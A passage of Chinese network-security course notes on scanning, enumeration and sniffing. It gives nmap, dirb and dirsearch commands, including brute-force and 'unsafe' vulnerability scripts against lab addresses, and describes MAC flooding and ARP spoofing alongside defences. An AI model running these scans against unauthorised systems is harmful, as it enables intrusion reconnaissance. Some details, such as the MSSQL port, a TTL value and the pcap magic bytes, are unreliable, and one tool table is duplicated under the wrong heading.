9 ms    13 ms     8 ms  172.29.255.254\n  2     *        *        *     请求超时。\n  3     *        *        *     请求超时。\n  4     *        *        *     请求超时。\n  5    12 ms     6 ms    11 ms  scn-rgw8.gznet.edu.cn [202.112.19.85]\n  6     6 ms    11 ms     8 ms  101.4.114.62\n  7     *        *        *     请求超时。\n  8     *        *        *     请求超时。\n  9     *        *        *     请求超时。\n 10     *        *        *     请求超时。\n 11     *        *        *     请求超时。\n 12    62 ms    57 ms    67 ms  101.4.117.177\n 13    60 ms    60 ms    58 ms  202.200.28.186\n 14    59 ms    56 ms    57 ms  121.194.14.84\n\n跟踪完成。\n```\n\n### 10.3.2 网络扫描技术\n\n| 网络扫描类型          | 网络扫描目的                                                 |\n| --------------------- | ------------------------------------------------------------ |\n| 主机扫描              | 找出网段内活跃主机                                           |\n| 端口扫描              | 找出主机上所开放的网络服务                                   |\n| 操作系统/网络服务辨识 | 识别主机安装的操作系统类型与开放网络服务类型，以选择不同渗透攻击代码及配置 |\n| 漏洞扫描              | 找出主机/网络服务上所存在的安全漏洞，作为渗透点              |\n\n#### 10.3.2.1 主机扫描(Ping扫描)\n\n主机扫描目的：检查目标主机是否活跃\n\n主机扫描方式：\n\n- 传统ICMP Ping扫描\n- ACK Ping扫描\n- SYN Ping扫描\n- UDP Ping扫描：到关闭端口\n\n主机扫描程序：\n\n- Ping\n- Nmap：-sP选项，缺省执行，集合了以上几种扫描方式\n\nPing扫射：同时扫描大量地IP地址段，以发现某个IP地址是否绑定活跃主机的扫描。\n\n主机扫描防范措施：\n\n单一主机Ping扫描很常见，危害性也不大，更关注Ping扫射。\n\n监测：网络入侵检测系统Snort；主机扫描监测工具Scanlogd\n\n防御：仔细考虑对ICMP通信的过滤策略\n利用Ping构建后门: loki(Phrackv51#06), pingd\n\n#### 10.3.2.2 端口扫描\n\n端口：TCP/UDP(1-64K)，运行网络应用服务\n\n端口分类：\n\n1. 知名端口0-1023(Well_Known Ports)\n\n- 80/TCPHTTP(超文本传输协议)：用于传输网页\n- 81/TCPHTTP预备(超文本传输协议)\n- 443/TCPHTTPS(超文本安全传输协议)\n\n2. 注册端口为1024-49151(Registered Ports)\n\n- 4433/tcp, udp\t\t     Microsoft SQL database system \n- 1434/tcp, udp             Microsoft SQL Monitor\n\n3. 动态端口或私有端口为49152-65535(Dynamic Ports)\n\n- 这些端口号一般不固定分配给某个服务，只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。\n\n连接目标主机的TCP和UDP端口，确定哪些服务正在运行即处于监听状态的过程。\n\n端口扫描目的：\n\n- 防御者－更加了解所管理的网络状况，找出没有必要开放的端口并关闭，这是保证业务网络安全的第一步。\n- 攻击者－找出可供进一步攻击的网络服务，同时结合操作系统探测技术也可以确定目标主机所安装的操作系统版本。开放网络服务和操作系统版本信息为攻击者提供了破解攻击的目标，使其更容易找出进入目标主机的漏洞路径。\n\n##### 10.3.2.2.1 TCP连接扫描\n\n- 调用connect() socket函数连接目标端口\n- 开放端口：完成完整的TCP三次握手(SYN, SYN|ACK, ACK)，timeout/RST\n- 关闭端口：SYN, RST\n- 优势&弱势：无需特权用户权限可发起，目标主机记录大量连接和错误信息，容易检测\n\n{% asset_img TCP连接扫描.png TCP连接扫描 %}\n\n##### 10.3.2.2.2 SYN扫描\n\n- 半开扫描(half-open scanning)\n- 开放端口：攻击者SYN, 目标主机SYN|ACK, 攻击者立即反馈RST包关闭连接\n- 关闭端口：攻击者SYN, 目标主机RST\n- 优势&弱势：目标主机不会记录未建立连接，较为隐蔽，需根用户权限构建定制SYN包\n\n{% asset_img SYN扫描.png SYN扫描 %}\n\n##### 10.3.2.2.3 隐蔽端口扫描\n\nTCP连接扫描和SYN扫描并不隐蔽：防火墙会监控发往受限端口的SYN包。\n\n隐蔽端口扫描通过构造特殊的TCP标志位，以躲避检测，同时达成端口扫描目的。\n\nFIN扫描(只带FIN位), Null扫描(全为0), XMAS扫描(FIN/URG/PUSH)\nFTP弹射扫描：利用FTP代理选项达到隐蔽源地址\n\n- 开放端口：标准TCP协议规范，接受这些伪造TCP包，丢弃，无任何反馈\n- 关闭端口：反馈RST包\n\nWindows/Cisco等系统没有遵从规范，开放端口对于伪造TCP包也反馈RST，以上这三种方法不适用。\n\n##### 10.3.2.2.4 UDP端口扫描\n\n- 对目标端口发送特殊定制的UDP数据报文\n- 开放端口: UDP反馈\n- 关闭端口: ICMP port unreachable报文\n\n{% asset_img UDP端口扫描.png UDP端口扫描 %}\n\n```\nnmap -sU\n```\n\n##### 10.3.2.2.5 防范措施\n\n- 任何攻击技术都是双刃剑\n\n  网络管理员也可利用端口扫描确定开放必要服务\n\n- 端口扫描的监测\n  网络入侵检测系统: Snort中的portscan检测插件\n  系统扫描检测工具: scanlogd, PortSentry, Genius\n\n- 端口扫描的预防\n\n  - 开启防火墙\n    类UNIX: netfilter/IPTables, Win32: 个人防火墙\n  - 禁用所有不必要的服务,尽可能减少暴露面(进一步的受攻击面)\n    类UNIX: /etc/inetd.conf，Win32: 控制面板/服务\n\n##### 10.3.2.2.6 目录扫描\n\n目录扫描要有字典，相当于暴力破解，扫描是否有字典中的目录。kali下的目录扫描工具：dirb/dirsearch\n\n```\ndirb http://192.168.137.146/mutillidae\n\npython3 dirsearch.py -u www.XXX.com -e*(-e参数也可不指定语言，用*号表示所有语言)\n```\n\n返回CODE:200才可以进去此目录。\n\n#### 10.3.2.3 系统类型探查\n\n系统类型探查：探查活跃主机的系统及开放网络服务的类型\n\n1. 目标主机上运行着何种类型什么版本的操作系统\n2. 各个开放端口上监听的是哪些网络服务\n\n目的：\n\n- 为更为深入的情报信息收集，真正实施攻击做好准备\n- 如远程渗透攻击需了解目标操作系统类型与配置\n\n##### 10.3.2.3.1 操作系统类型探查\n\n通过各种不同操作系统类型和版本实现机制上的差异：\n\n- 协议栈实现差异－协议栈指纹鉴别\n- 开放端口的差异－端口扫描\n- 应用服务的差异－旗标攫取\n\n通过特定方法以确定目标主机所安装的操作系统类型和版本的技术手段。\n\n明确操作系统类型和版本是进一步进行安全漏洞发现和渗透攻击的必要前提。\n\n辨识方式：\n\n–主动－操作系统主动探测技术\n\n–被动－被动操作系统识别技术\n\n###### 10.3.2.3.1.1 利用网络协议栈指纹识别OS\n\nPing中的TTL。TTL：生存时间\n\n| 操作系统    | TTL  |\n| ----------- | ---- |\n| LINUX       | 64   |\n| WIN2K/NT    | 128  |\n| WINDOWS系列 | 32   |\n| UNIX系列    | 255  |\n\n现实中的TTL值可能都不是以上数值，跟哪个接近就判断是哪个系统。\n\n##### 10.3.2.3.2 网络服务类型探查\n\n确定目标网络中开放端口上绑定的网络应用服务类型和版本。\n\n了解目标系统更丰富信息, 可支持进一步的操作系统辨识和漏洞识别。\n\n网络服务主动探测：旗标抓取\n\n```\nnmap -sV\n```\n\n网络服务被动识别：特征匹配PADS\n\n##### 10.3.2.3.3 防范措施\n\n并没有太多好办法。应立足于即使攻击者探查出了操作系统和网络服务类型，也不能轻易的攻破这道“坚固的防线”。\n\n#### 10.3.2.4 Nmap\n\nnmap是安全渗透领域最强大的开源端口扫描器，能跨平台支持运行。\n\n```\nhttps://nmap.org\nhttp://sectools.org\n```\n\n扫描示例\n\n```\n主机发现\t\tnmap -sn 192.168.137.144/24\n端口扫描\t\tnmap -sS -p1-1000 192.168.137.144\n系统扫描\t\tnmap -O 192.168.137.144\n网络服务扫描\t   nmap -sV 192.168.137.144\n综合扫描\t\tnmap -A 192.168.137.144\n\n脚本扫描\t\t/usr/share/nmap/scripts\n\t\t\t\tnmap --script=default 192.168.137.144\n\t\t\t\tnmap --script=auth 192.168.137.144\n\t\t\t\tnmap --script=brute 192.168.137.144\n\t\t\t\tnmap --script=vuln 192.168.137.144\n\t\t\t\tnmap --script=broadcast 192.168.137.144\n\t\t\t\tnmap --script=smb-brute.nse 192.168.137.144\n\t\t\t\tnmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.144\n\t\t\t\tnmap --script=smb-vuln-conficker.nse --script-args=unsafe=1 192.168.137.144\n\t\t\t\tnmap -p3306 --script=mysql-empty-password.nse 192.168.137.144\n```\n\nUDP、ICMP首部长度8byte，TCP、IP首部长度20byte\n\nzenmap——图形化nmap\n\n```\nnmap T4 -A -v 192.168.137.144\n-T\t设置速度等级，1-5级，数字越大速度越快\n-A\t综合扫描\n-v\t输出扫描过程\n```\n\n#### 10.3.2.5 漏洞扫描\n\n系统攻防的核心：安全漏洞、Exploit(渗透攻击)/恶意代码、安全防御与检测机制三者之间的技术博弈。\n\n{% asset_img 安全漏洞生命周期.png 安全漏洞生命周期 %}\n\n漏洞扫描技术：\n\n- 检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术。\n- 双刃剑\n  -网络管理员用来检查系统安全性，渗透测试团队(Red Team)用于安全评估。\n  -攻击者用来列出最可能成功的攻击方法，提高攻击效率。\n\n已发布安全漏洞数据库：\n\n- 业界标准漏洞命名库Common Vulnerabilities and Exposures([CVE][http://cve.mitre.org])\n  - 一本漏洞字典，为大家广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。\n  - CVE标准使用一个共同的名字，帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据，虽然这些工具很难整合在一起。\n\n- National Vulnerability Database([NVD][ https://nvd.nist.gov ])\n- 国家信息安全漏洞共享平台([CNVD][•https://www.cnvd.org.cn])\n\nThe Common Vulnerability Scoring System(CVSS)\n\n- 基本分：漏洞固有的、根本性的属性\n- 时间分：漏洞与时间相关的属性\n- 环境分：不同用户环境中产品安全漏洞所造成的危害程度\n\n{% asset_img CVSS评分过程.png CVSS评分过程 %}\n\n| 等级     | CVSS分数 |\n| -------- | -------- |\n| None     | 0        |\n| Low      | 0.1-3.9  |\n| Medium   | 4.0-6.9  |\n| High     | 7.0-8.9  |\n| Critical | 9.0-10.0 |\n\n##### 10.3.2.4.1 漏洞扫描软件\n\n###### 10.3.2.4.1.1 Nessus\n\n目前最优秀的共享漏洞扫描软件http://www.nessus.org/\n\n一个功能强大而又易于使用的网络漏洞扫描工具，运行于 Linux, Windows, OSX, BSD, Solaris等系统。    \n\n该系统被设计为客户/服务器模式，服务器端负责进行安全扫描，客户端用来配置、管理服务器端，客户端和服务器端之间的通信使用SSL加密。\n\n第一个使用插件的漏洞扫描工具，支持实时的插件升级，具有检测漏洞多、准确、速度快的特点使其在众多漏洞扫描器中脱颖而出。其强大的功能是依赖于其丰富的插件来实现的。\n\n客户端/服务器模式\n\n- 服务器端: nessesd(Tcp1241)\n- 客户端: nessus-q (命令行客户端), nessus(UNIX图形客户端), Nessus Client(Win32客户端)\n\n框架/插件模式\n\n- 安全漏洞扫描插件: 使用NASL语言容易编写并集成至Nessus框架中\n- 插件间可互相依赖和协同工作(端口探测－漏洞扫描插件)\n\nNASL语言(Nessus Attack Scripting Language)\n\n多种报告方式：\n文本/LaTeX/HTML/DHTML/XML/SQL等\n\nNessus体系结构：\n\n{% asset_img Nessus体系结构.png Nessus体系结构 %}\n\n(1)客户端程序向服务端程序发送详细的扫描任务的参数(遵循nessus传输协议)；\n\n(2)服务端程序接收到客户端程序的请求后，加载完成任务所需要的插件，并合理安排插件的执行顺序；\n\n(3)NASL语言解释器执行插件，在执行插件扫描过程中会与扫描目标之间有一些数据交互；\n\n(4)NASL解释器判断扫描结果，并报告给服务端程序；\n\n(5)服务端程序归纳从NASL解释器收到的扫描结果，生成漏洞报告反馈给客户端程序。\n\n###### 10.3.2.4.1.2 AWVS\n\n通过网络爬虫测试你的网站安全，检测流行安全漏洞。\n\n###### 10.3.2.4.1.3 AppScan\n\n###### 10.3.2.4.1.4 BurpSuite\n\n功能模块\n\n```\ntarget\t\t目标模块用于设置扫描域、生成站点地图、生成安全分析\nproxy\t\t代理模块用于拦截浏览器的http会话内容\nspider\t\t爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图\nscanner\t\t扫描模块用于自动化检测漏洞，分为主动和被动扫描\nintruder\t入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击\n\t\t\t入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试\nrepeater\t重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试\nsequencer\t序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造\ndecoder\t\t解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换\ncomparer\t对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响\nextender\t通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能\n\t\t\t通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写\noptions\t\t分为project/user options，主要对软件进行全局设置\nalerts\t\t显示软件的使用日志信息\n```\n\n###### 10.3.2.4.1.5 OpenVAS\n\n开放式漏洞评估系统，是一个用于评估目标漏洞的杰出框架，开源且功能十分强大。\n\n```\nhttp://www.openvas.org\nhttp://www.greenbone.net\n```\n\n不装了这能装一天。。下面给个安装教程吧\n\n```\n升级kali\napt-get update\napt-get dist-upgrade\n\n安装OpenVAS\napt-get install openvas\nopenvas-setup\n\n修改admin账户密码\nopenvasmd --user=admin --new-password=password\n\n启动openvas\nopenvas-start\n\n检查安装，一定要先启动再检查\nss -tnlp\nopenvas-check-setup\n\n登录openvas\nhttps://192.168.137.144:9392\n```\n\n功能模块\n\n```\ntarget\t\t目标模块用于设置扫描域、生成站点地图、生成安全分析\nproxy\t\t代理模块用于拦截浏览器的http会话内容\nspider\t\t爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图\nscanner\t\t扫描模块用于自动化检测漏洞，分为主动和被动扫描\nintruder\t入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击\n\t\t\t入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试\nrepeater\t重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试\nsequencer\t序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造\ndecoder\t\t解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换\ncomparer\t对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响\nextender\t通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能\n\t\t\t通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写\noptions\t\t分为project/user options，主要对软件进行全局设置\nalerts\t\t显示软件的使用日志信息\n```\n\n##### 10.3.2.4.2 防范措施\n\n最简单对策：\n\n- 假设黑客会使用漏洞扫描来发现目标网络弱点，那你必须在黑客之前扫描漏洞\n- 补丁自动更新和分发: 修补漏洞\n\n联邦桌面核心配置计划(FDCC)\n\n- 确保桌面计算机的安全漏洞及补丁自动管理\n\n检测和防御漏洞扫描行为\n\n- 网络入侵检测系统: Snort\n- 仔细审查防火墙配置规则\n\n### 10.3.3 网络查点\n\n针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。\n\n与网络踩点、扫描的区别\n\n- 与网络踩点技术的关键区别：攻击者的入侵程度\n- 与网络扫描技术的关键区别：攻击者的针对性与信息收集的目标性\n\n#### 10.3.3.1 网络查点能够收集到的信息\n\n用户账户名、错误配置的共享资源、网络服务版本号，这些看起来好像是无害的，但一旦这些信息被细心的高水平攻击者所掌握，就可能成为危害目标系统安全的祸根。\n\n- 用户帐户名：口令猜测破解\n- 错误配置的共享资源：恶意程序上传\n- 老旧的网络服务版本：缓冲区溢出漏洞攻击\n\n#### 10.3.3.2. 网络查点技术\n\n##### 10.3.3.2.1 网络服务旗标抓取技术\n\n最基础和最通用的技术方法。利用客户端工具连接至远程网络服务并观察输出以收集关键信息的技术手段。\n\n```\n-telnet\n-netcat\n```\n\n##### 10.3.3.2.2 通用网络服务查点\n\n- 跨平台，常用服务\n\n- Web服务、FTP文件传输服务、POP3及SMTP电子邮件收发服务\n\n###### 10.3.3.2.2.1 FTP服务查点\n\n-控制协议TCP 21端口，没有任何加密，明文传输口令\n-匿名登录，甚至匿名上传与下载文件\n-FTP查点很简单：使用FTP客户端程序连接即可\n-FTP服务旗标、共享目录、可写目录等信息，可能还会提供FTP帐户名等信息\n-查点后攻击：弱口令猜测与破解、已知FTP服务漏洞渗透攻击\n\n###### 10.3.3.2.2.2 SMTP服务查点\n\nSMTP电子邮件发送协议查点\n-最经典的网络服务查点技术之一\n-两类特殊指令VRFY和EXPN\n-VRFY指令：对合法用户的名字进行验证\n-EXPN指令：显示假名与邮件表实际发送地址\n-可验证和搜索邮件服务器上的活跃帐户\n\nSMTP电子邮件发送协议查点危害\n-伪造更具欺骗性电子邮件，社会工程学攻击\n-探测SMTP服务器枚举出其中有效的电子邮件地址列表，大量发生垃圾邮件\n\n##### 10.3.3.2.3 类Unix平台网络服务查点\n\n古老的finger, rwho, rusers查点\n-用户帐户和登录信息\n-已不常用\n\nRPC查点(TCP/UDP 111, 32771)\n-RPC远程过程调用: portmapperrpcbind\n-RPC查点工具\n\trpcinfo-p HOST: 枚举主机上提供的RPC服务\n\trpcdump(Windows平台运行)\n\tnmap-sS-sRHOST\n\nRPC查点防御策略\n-Secure RPC, 111/32771端口防火墙过滤\n\n##### 10.3.3.2.4 Windows平台网络服务查点\n\nWindows网络服务\n\n- NetBIOS网络基本输入输出系统服务\n\n  -Windows独有的局域网组网协议\n\n- SMB文件与打印共享服务\n\n- AD活动目录与LDAP轻量级目录访问协议\n\n- MSRPC微软远过程调用服务\n\n  -PRC/DCOM\n\nWindows平台网络服务查点\n-NetBIOS主机查点\n-SMB会话查点\n-目录查点\n-MSRPC查点\n\n###### 10.3.3.2.4.1 Windows Networking API \n\n- WinSock API\n\n- 命名管道(Named Pipes)和邮件槽(Mail Slots)\n\n  - 命名管道：提供可靠双向通信，协议无关的标识Windows网络资源的方法\n  - 邮件槽：提供不可靠的单向数据传输，支持广播\n\n- Web访问API\n\n  -WinInet/WinHTTP/HTTP API\n\n###### 10.3.3.2.4.2 NetBIOS\n\n- NetBIOS(网络基本输入/输出系统)：最初由IBM开发，MS利用NetBIOS作为构建局域网的上层协议\n\n- NetBIOS使得程序和网络之间有了标准的接口，方便应用程序的开发。并且可以移植到其他的网络中\n\n- NetBIOS位于OSI模型会话层，TCP/IP之上\n\n- NetBIOS有两种通讯模式\n  - 会话模式。一对一进行通讯，LAN中的机器之间建立会话，可以传输较多的信息，并且可以检查传输错误\n  - 数据报模式。可以进行广播或者一对多的通讯，传输数据大小受限制，没有错误检查机制，也不必建立通讯会话\n\n- NetBIOS over TCP/IP，支持三种服务\n  - 名字服务UDP 137\n  - 会话服务TCP 139/445\n  - 数据报服务UDP 138\n\nNetBIOS网络查点\n\n- 使用net view命令查点域\n  - 列出网络上的工作组和域：net view /domain\n  - 列出指定组/域中的所有计算机：net view /domain:DOMAIN_NAME\n  \n  {% asset_img netview查点域.png netview查点域 %}\n  \n- 查点域控制器\n\n  - Windows Resource Kit -nltest工具\n\n    Nltest.exe 是非常强大的命令行实用程序，用于测试在 Windows NT 域中的信任关系和域控制器复制的状态。域包含，还有一个主域控制器 (PDC) 和零个或多个备份域控制器 (BDC) 的域控制器。\n\n  {% asset_img 查点域控制器.png 查点域控制器 %}\n\n- 查点主机上的NetBIOS名字表\n\n  - nbtstat工具\n\n    主机中的NetBIOS名字表\n\n    计算机名、所在域、当前登录用户、当前运行服务和网卡硬件MAC地址\n\n  {% asset_img nbtstat.png nbtstat %}\n\n  - nbtscan工具\n\n    对整个局域网进行快速的nbtstat查询\n\n    NBTscan是一款在IP网络上扫描NetBIOS名称信息的工具。它通过给指定范围内所有地址发送状态查询来获得反馈信息并以表形式呈现给使用者。每一地址的反馈信息包括IP地址、NetBIOS计算机名、登录用户、MAC地址。\n\n- 其他工具\n\n  epdump, rpcdump, getmac, netdom, netviewx, Winfo, nbtdump, …\n\n- 防范措施\n\n  - 网络：防火墙禁止外部访问TCP/UDP 135-139，445端口\n  - 主机：配置IPSec过滤器，主机个人防火墙，禁用Alerter和Messenger服务\n\n###### 10.3.3.2.4.3 MSRPC远程进程调用/DCOM\n\nRPC (Remote Procedure Call)\n\n- 网络编程标准\n- 目的: 提供“能在某种程度上像应用程序开发人员隐藏有关网络编程细节”的编程模型\n\nRPC调用\n\n- 允许程序员编写的客户应用程序跨网络调用远程计算机上服务器应用程序中的过程\n\n客户机对服务器的RPC调用操作：\n\n1.调用客户端句柄；执行传送参数\n2.调用本地系统内核发送网络消息\n3.消息传送到远程主机\n4.服务器句柄得到消息并取得参数\n5.执行远程过程\n6.执行的过程将结果返回服务器句柄\n7.服务器句柄返回结果，调用远程系统内核\n8.消息传回本地主机\n9.客户句柄由内核接收消息\n10.客户接收句柄返回的数据\n\n{% asset_img PRC调用操作.png PRC调用操作 %}\n\n###### 10.3.3.2.4.4 COM/DCOM\n\nCOM对象: 使应用程序由不同组件构成，导出面向对象接口，提高软件模块化、可扩展性和可交互性。\n\nDCOM: 提供COM组件的位置透明性，依赖于RPC\n\n###### 10.3.3.2.4.5 常用的Windows应用层网络服务\n\n- Network Applications\n\n- IIS (Internet Information Services)\n  HTTP/FTP/…\n- Email\n  Exchange Server\n- Database\n  MS SQL Server\n- RDP\n  Remote Desktop Protocol\n- 通常以Windows服务方式后台运行\n\n###### 10.3.3.2.4.6 Windows服务\n\n- Windows服务－系统启动时刻启动进程的机制，提供不依赖于任何交互式的服务。\n\n- Windows服务\n  - 服务应用程序\n    注册服务Advapi32.dll, CreateService/StartServices\n    注册表: HKLM\\SYSTEM\\CurrentControlSet\\Services\n    共享服务进程: 服务宿主svchost.exe\n  - 服务控制管理器(SCM, service control manager, services.exe)\n    Winlogon进程在加载GINA之前执行SCM启动函数\n    SCM中的ScCreateServiceDB根据注册表分别启动服务\n    SCM中的ScAutoStartServices启动“自动启动”的服务\n  - 服务控制程序(SCP, service control program)\n    控制面板，服务插件…\n\n# 11. 网络嗅探与协议分析\n\n- 网络嗅探(Sniff)\n\n–网络监听、网络窃听\n\n–类似于传统的电话线窃听\n\n- 网络嗅探技术定义\n\n–利用计算机网络接口截获目的地为其他计算机的数据报文\n\n–监听网络流中所包含的用户账户密码或私密信息等\n\n- 网络嗅探器(Sniffer)\n\n–实现嗅探的软件或硬件设备\n\n–嗅探获得数据二进制格式数据报文\n\n–解析和理解二进制数据，获取各层协议字段和应用层传输数据网络协议分析\n\n- 危害与作用\n\n  - 攻击者：内网渗透技术\n\n    窃取机密信息，为发起进一步攻击收集信息\n\n  - 防御者\n\n    管理员可以用来监听网络的流量情况，定位网络故障\n\n    为网络入侵检测系统提供底层数据来源基础\n\n  - 其他作用\n\n    开发网络应用的程序员可以监视程序的网络情况\n\n- 网络嗅探技术与工具分类\n\n  - 以太网嗅探\n  - WiFi嗅探\n  - …\n  - 目前一些著名嗅探器支持多种链路层网络嗅探，wireshark, Sniffer Pro…\n\n- 工具形态\n\n  - 软件嗅探器\n  - 硬件嗅探器(协议分析仪): 专用设备, 速度快, 额外功能(如流量记录与重放等), 价格昂贵\n\n## 11.1 以太网络\n\n### 11.1.1 工作原理\n\n- 载波侦听/冲突检测(CSMA/CD: 802.3, carrier sense multiple access with collision detection)技术\n  - 载波侦听：是指在网络中的每个站点都具有同等的权利，在传输自己的数据时，首先监听信道是否空闲\n    \t如果空闲，就传输自己的数据\n      \t如果信道被占用，就等待信道空闲\n  - 而冲突检测则是为了防止发生两个站点同时监测到网络没有被使用时而产生冲突\n- 以太网采用了CSMA/CD技术，由于使用了广播机制，所以，所有在同一媒介信道上连接的工作站都可以看到网络上传递的数据。\n\n### 11.1.2 工作模式\n\n- 网卡的MAC地址(48位)\n\n  –通过ARP来解析MAC与IP地址的转换\n\n  –用ipconfig/ifconfig可以查看MAC地址\n\n- 正常情况下，网卡应该只接收这样的包\n\n  –MAC地址与自己相匹配的数据帧\n\n  –广播包\n\n- 网卡完成收发数据包的工作，两种接收模式\n\n  –混杂模式：不管数据帧中的目的地址是否与自己的地址匹配，都接收下来\n\n  –非混杂模式：只接收目的地址相匹配的数据帧，以及广播数据包(和组播数据包)\n\n- 为了监听网络上的流量，必须设置为混杂模式\n\n## 11.2 共享式网络与交换式网络\n\n### 11.2.1 共享式网络\n\n–通过Hub(集线器)连接\n\n–总线方式: 通过网络的所有数据包\n\n–发往每一个主机\n\n–能够嗅探整个Hub上全部网络流量\n\n{% asset_img 共享式网络.png 共享式网络 %}\n\n### 11.2.2 交换式网络\n\n–通过Switch(交换机)连接\n\n–由交换机构造一个“MAC地址-端口”映射表\n\n–发送包的时候，只发到特定端口上\n\n–只能监听同一端口上流量\n\n–可通过流量映像口监听(SPAN)\n\n{% asset_img 交换式网络.png 交换式网络 %}\n\n#### 11.2.2.1 交换式网络中的嗅探攻击\n\n- MAC地址洪泛攻击\n\n  向交换机发送大量虚构MAC地址和IP地址数据包\n  致使交换机“MAC地址-端口映射表”溢出\n  交换机切换入所谓的“打开失效”模式-“共享式”\n\n- MAC欺骗\n\n  假冒所要监听的主机网卡，将源MAC地址伪造成目标主机的MAC地址\n  交换机不断地更新它的“MAC地址-端口映射表”\n  交换机就会将本应发送给目标主机的数据包发送给攻击者\n\n- ARP欺骗(中间人攻击)\n\n  利用IP地址与MAC地址之间进行转换时的协议漏洞\n\n## 11.3 应用程序抓包的技术\n\n- 类Unix平台提供了标准的API支持\n\n  内核态: BPF(Berkeley Packet Filter)\n  用户态函数库：libpcap\n  用户态嗅探程序：tcpdump等\n\n- Windows平台通过驱动程序来抓取数据包\n\n  驱动程序: NPF(NetGroupPacket Filter)\n  用户态函数库：winpcap\n  用户态嗅探程序：windump等\n\n### 11.3.1 BPF\n\n- BSD数据包捕获\n\n  –BPF是一个核心态的组件，支持数据包“过滤”抓取\n\n  –Network Tap接收所有的数据包\n\n  –BPF虚拟机机器语言的解释器，比较/算术等操作\n\n  –Kernel Buffer，保存过滤器送过来的数据包\n\n  –User buffer，用户态上的数据包缓冲区\n\n- Libpcap(一个抓包工具库)支持BPF\n\n  –Libpcap是用户态的一个抓包工具\n\n  –Libpcap几乎是系统无关的\n\n- BPF是一种比较理想的抓包方案\n\n  –在核心态，所以效率比较高\n\n  –目前类UNIX系统的标准抓包内核模块 \n\n{% asset_img BPF和libpcap.png BPF和libpcap %}\n\n### 11.3.2 libpcap抓包库\n\n- 用户态下的抓包库\n\n- 系统独立的接口，C语言接口\n\n  –多种其他高级编程语言包装接口: Perl, Python, Ruby, Tcl, Java, …\n\n- 广泛应用于\n\n  –网络统计软件\n\n  –入侵检测系统\n\n  –网络调试\n\n- 支持过滤机制，BPF\n\n## 11.4 pcap格式\n\n基本格式：文件头、数据包头、数据报、数据包头、数据报...\n\n{% asset_img pcap格式.png pcap格式 %}\n\n```c\nstruct pcap_file_header {\n        bpf_u_int32 magic;    //4字节 pcap文件标识 目前为“d4 c3 b2 a1”\n        u_short version_major;   //2字节 主版本号 \n        u_short version_minor;  // 2字节 次版本号 \n        bpf_int32 thiszone;     /* 4字节 时区修正     并未使用，目前全为0*/\n        bpf_u_int32 sigfigs;    /* 4字节 精确时间戳   并未使用，目前全为0 */\n        bpf_u_int32 snaplen;    /* 4字节 抓包最大长度, 抓全设为0x0000ffff, 缺省为68字节 */\n        bpf_u_int32 linktype;   /* 4字节 链路类型    一般都是1：ethernet*/\n};\n\n```\n\n各字段说明：\n\n| 字段     | 字节 | 16进制表示  | 含义                 |\n| -------- | ---- | ----------- | -------------------- |\n| Magic    | 4B   | 1A 2B 3C 4D | 标示文件的开始       |\n| Major    | 2B   | 02 00       | 当前文件主要的版本号 |\n| Minor    | 2B   | 04 00       | 当前文件次要的版本号 |\n| ThisZone | 4B   |             | 当地的标准时间       |\n| SigFlags | 4B   |             | 时间戳的精度         |\n| SnapLen  | 4B   |             | 最大的存储长度       |\n| LinkType | 4B   |             | 链路类型             |\n\nLinkType链路类型\n\n| 值   | 类型                                                         |\n| ---- | ------------------------------------------------------------ |\n| 0    | BSD loopback devices, except for later OpenBSD               |\n| 1    | Ethernet, and Linux loopback devices                         |\n| 6    | 802.5 Token Ring                                             |\n| 7    | ARCnet                                                       |\n| 8    | SLIP                                                         |\n| 9    | PPP                                                          |\n| 10   | FDDI                                                         |\n| 100  | LLC/SNAP-encapsulated ATM                                    |\n| 101  | \"raw IP\", with no link                                       |\n| 102  | BSD/OS SLIP                                                  |\n| 103  | BSD/OS PPP                                                   |\n| 104  | Cisco HDLC                                                   |\n| 105  | 802.11                                                       |\n| 108  | later OpenBSD loopback devices (with the AF_value in network byte order) |\n| 113  | special Linux \"cooked\" capture                               |\n| 114  | LocalTalk                                                    |\n\n{% asset_img pcap格式2.png pcap格式2 %}\n\n```c\nstruct pcap_pkthdr {\n        struct timeval ts;      /* time stamp */\n        bpf_u_int32 caplen;     /* length of portion present */\n        bpf_u_int32 len;        /* length this packet (off wire) */\n};\nstruct timeval {\n        long            tv_sec;         /* seconds (XXX should be time_t) */\n        suseconds_t     tv_usec;        /* and microseconds */\n};\n```\n\n各字段说明：\n\n| 字段      | 含义                                                         |\n| --------- | ------------------------------------------------------------ |\n| Timestamp | 时间戳高位，精确到seconds                                    |\n| Timestamp | 时间戳低位，精确到microseconds                               |\n| Caplen    | 当前数据区的长度，即抓取到的数据帧长度，由此可以得到下一个数据帧的位置。 |\n| Len       | 离线数据长度，网络中实际数据帧的长度，一般不大于caplen，多数情况下和Caplen数值相等。 |\n\nPacket 数据：即 